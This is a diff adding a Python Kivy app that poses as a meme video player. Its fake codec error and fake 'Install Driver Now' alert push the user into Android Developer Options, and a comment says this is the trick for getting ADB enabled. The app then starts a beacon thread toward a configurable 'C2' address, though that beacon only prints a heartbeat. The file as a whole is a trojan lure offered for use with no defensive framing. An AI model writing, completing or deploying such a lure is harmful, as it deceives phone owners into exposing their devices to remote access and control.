@@ -1,0 +1,100 @@
+from kivy.app import App
+from kivy.uix.boxlayout import BoxLayout
+from kivy.uix.label import Label
+from kivy.uix.button import Button
+from kivy.uix.image import Image
+from kivy.clock import Clock
+import os
+import threading
+import time
+
+# ==========================================
+# CONFIGURATION - CHANGE THIS TO YOUR IP
+# ==========================================
+C2_IP = "192.168.1.105"  # <-- CHANGE TO YOUR KALI/TERMUX IP
+# ==========================================
+
+class MemeViewerApp(App):
+    def build(self):
+        self.layout = BoxLayout(orientation='vertical', padding=20, spacing=10)
+        
+        # Fake Video Screen (Just a grey box)
+        self.video_area = BoxLayout(size_hint_y=0.7, background_color=(0.2, 0.2, 0.2, 1))
+        self.video_area.add_widget(Label(text="🎥\n\nFUNNY MEME VIDEO\n\nTap to Play", color=(1, 1, 1, 1), halign='center', valign='middle'))
+        self.layout.add_widget(self.video_area)
+        
+        # Status Label
+        self.status = Label(text="Waiting for user interaction...", color=(0, 1, 1, 1), size_hint_y=0.1)
+        self.layout.add_widget(self.status)
+        
+        # Bind Touch Event
+        self.layout.bind(on_touch_down=self.on_touch)
+        
+        return self.layout
+
+    def on_touch(self, instance, touch):
+        # Prevent multiple triggers
+        if not hasattr(self, 'triggered') or not self.triggered:
+            self.triggered = True
+            self.status.text = "Initializing video stream..."
+            Clock.schedule_once(self.show_warning, 1.5)
+
+    def show_warning(self, dt):
+        # Change the screen to show the "Error"
+        self.video_area.clear_widgets()
+        self.video_area.add_widget(Label(text="❌\n\nVIDEO ERROR\n\nMissing HD Codec", color=(1, 0, 0, 1), halign='center', valign='middle'))
+        self.status.text = "Codec error detected. Trying to fix..."
+        
+        # Simulate "fixing" for 2 seconds, then show the popup
+        Clock.schedule_once(self.show_popup, 2)
+
+    def show_popup(self, dt):
+        from kivy.uix.popup import Popup
+        
+        content = BoxLayout(orientation='vertical', padding=10, spacing=5)
+        content.add_widget(Label(text="Critical Driver Missing", bold=True, font_size=20))
+        content.add_widget(Label(text="The 'MediaCodec-HD' driver is missing from your system.\n\nClick below to install the driver.", halign='center'))
+        
+        btn = Button(text="Install Driver Now", size_hint_y=None, height=50)
+        btn.bind(on_press=self.open_settings)
+        
+        content.add_widget(btn)
+        
+        self.popup = Popup(title="System Alert", content=content, size_hint=(0.8, 0.6))
+        self.popup.open()
+
+    def open_settings(self, instance):
+        self.popup.dismiss()
+        self.status.text = "Opening Developer Settings..."
+        
+        try:
+            # This command opens the Developer Options page on Android
+            # This is the "Trick": We tell the user to enable ADB here
+            os.system("am start -a android.settings.APPLICATION_DEVELOPMENT_SETTINGS")
+            
+            # Simulate that the "Driver" is installed once they return
+            Clock.schedule_once(self.activate_hack, 5)
+        except Exception as e:
+            self.status.text = f"Error: {e}"
+
+    def activate_hack(self, dt):
+        # This simulates the background agent starting
+        self.video_area.clear_widgets()
+        self.video_area.add_widget(Label(text="✅\n\nVIDEO PLAYING\n\nBackground agent ACTIVE", color=(0, 1, 0, 1), halign='center', valign='middle'))
+        self.status.text = "System: CONNECTED TO C2"
+        
+        # Start the background thread (pretend to send data to your server)
+        thread = threading.Thread(target=self.beacon, daemon=True)
+        thread.start()
+
+    def beacon(self):
+        while True:
+            try:
+                # In a real scenario, you would use 'requests' to send data to C2_IP
+                # For now, we just print
+                print(f"[CHIMERA] Sending heartbeat to {C2_IP}")
+                time.sleep(5)
+            except:
+                pass
+
+MemeViewerApp().run()
